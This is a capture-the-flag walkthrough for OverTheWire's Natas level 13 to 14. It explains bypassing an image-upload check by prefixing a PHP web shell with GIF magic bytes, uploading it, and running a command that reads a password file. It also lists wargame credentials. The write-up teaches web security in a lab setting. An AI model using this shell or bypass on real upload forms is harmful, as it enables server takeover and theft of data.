# Natas Level 13 → Level 14

## 🚩 Challenge Info

- **Platform:** OverTheWire – Natas Wargame  
- **Level:** 13 → 14  
- **Category:** Web Security / File Upload Filter Bypass (Magic Bytes)  
- **URL:** http://natas13.natas.labs.overthewire.org  
- **Username:** `natas13`  
- **Password:** `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

---

## 🎯 Objective

Find the password for **natas14** by bypassing the file upload restrictions using **magic bytes**.

---

## 🔍 Observations

The page contains a **file upload form**, similar to the previous level.

However, this time uploading a `.php` file directly is **not allowed**.

### 1. Error Behavior
When attempting to upload a PHP file, the application rejects it, indicating that additional validation is in place.

### 2. Hypothesis
The server is likely checking the **file type using magic bytes** (file signatures), not just the filename.

---

## 🛠️ Investigation

### 1. Understanding the Filter

Unlike the previous level, the server now validates the file content.  
This is commonly done using functions like:
```
exif_imagetype()

or

getimagesize()
```
These functions check the magic bytes of a file to confirm if it is a valid image.

### 2. Crafting a Bypass Payload

We can bypass this validation by creating a hybrid file:

Start the file with valid image magic bytes (e.g., GIF)

Append PHP code after it

Example **payload**:
```
GIF89a
<?php system($_GET['cmd']); ?>
```
**GIF89a** → Valid GIF header

***PHP code** → Executed by the server

### 3. Uploading the Malicious File

Save the file as:

>shell.php

Upload it through the form.

Since the file starts with valid image bytes, it bypasses the filter and gets uploaded successfully.

### 4. Executing Commands

After uploading, the server provides a path such as:

`upload/xyz.php`

Execute a command:

>http://natas13.natas.labs.overthewire.org/upload/xyz.php?cmd=cat /etc/natas_webpass/natas14

## 💡 Discovery
### 1. Command Execution

The injected PHP code executes:

>cat /etc/natas_webpass/natas14
### 2. Retrieving the Password

The output reveals:
```php
natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ